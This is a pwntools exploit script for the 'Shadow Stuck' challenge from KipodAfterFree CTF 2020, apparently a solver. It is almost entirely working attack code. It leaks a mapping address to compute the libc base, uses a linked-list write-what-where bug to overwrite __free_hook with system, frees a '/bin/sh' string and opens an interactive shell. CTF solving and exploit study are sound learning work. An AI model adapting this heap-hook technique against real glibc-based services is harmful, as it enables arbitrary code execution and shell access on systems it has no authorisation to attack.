from pwn import *

# --- Info ---
# CTF: KipodAfterFree CTF 2020
# Date: -
# Challenge: Shadow Stuck
# Description: Exploit write-what-where in linked list to overwrite __free_hook
# --- End Info ---

#context.log_level = 'debug'
context.terminal = ["tmux", "sp", "-h"]
context.endian = 'little'

PATH = './shadowstuck'
LIBC = './libc-2.31.so'
ENV = {"LD_PRELOAD":"./libc-2.31.so"}
libc  = ELF(LIBC, checksec = False)
binary  = ELF(PATH, checksec = False)

REMOTE = 0

HOST = 'challenges.ctf.kaf.sh'
PORT = 8000

def add(data):
    r.recvuntil('[Q]uit\n>')
    r.sendline('A')
    r.recvuntil('name:\n>')
    r.sendline(data)

def delete(name, desc):
    r.recvuntil('[Q]uit\n>')
    r.sendline('F')
    r.recvuntil('fire?\n>')
    r.sendline(name)
    r.recvuntil('fired.\n>')
    r.sendline(desc)

def change(idx, data):
    r.recvuntil('[Q]uit\n>')
    r.sendline('C')
    r.recvuntil('rename?\n>')
    r.sendline(str(int(idx)))
    r.recvuntil('employee:\n>')
    r.sendline(data)

def read(idx):
    r.recvuntil('[Q]uit\n>')
    r.sendline('R')
    r.recvuntil('name of?\n>')
    r.sendline(str(int(idx)))
    data = r.recvuntil('[A]dd').replace('[A]dd', '')
    data = (data.split('has name: '))[1].split('\n')[0]
    return data
 
def quit(payload):
    r.recvuntil('[Q]uit\n>')
    r.sendline('Q')
    r.recvuntil('BOF on me.')
    r.sendline(payload)

def init_leak():
      data = r.recvuntil('Welcome')
      data = (data.split('set up at '))[1].split('\n')[0]
      leak = int(data, 16)
      return leak
      
def pad(addr):
    return addr + '\x00'*(8-len(addr))
    
context.binary = PATH
if REMOTE:
	r = remote(HOST, PORT)
else:
	r = process(PATH, env=ENV)

g_list_root = 0x555555558068                        # BSS addr of link list head

#if(not REMOTE):
#    gdb.attach(r)
#pause()

mmap_page = init_leak()                             # leak SHADOW_STACK address (already given)
shadow_stack = mmap_page + 4096                     # shadow_stack is mmap_page+4096
libc_base = mmap_page + 0x4000                      # libc base (mmap offset is fixed with libc at offset 0x2000 or 0x4000)

log.info('mmap page @ ' + hex(mmap_page))
log.info('shadow stack @ ' + hex(shadow_stack))
log.info('libc base @ ' + hex(libc_base))

system_addr = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']

log.info('system @ ' + hex(system_addr))
log.info('__free_hook @ ' + hex(free_hook))

add("AAAA")                                         # alloc a chunk
delete("AAAA", p64(free_hook-8)*3)                  # trigger write-what-where in linked list
change(1, '/bin/sh;'+ p64(system_addr))             # write system into __free_hook
delete('/bin/sh;'+ p64(system_addr), "/bin/sh;#")   # call free("/bin/sh\x00")

r.interactive()
r.close()
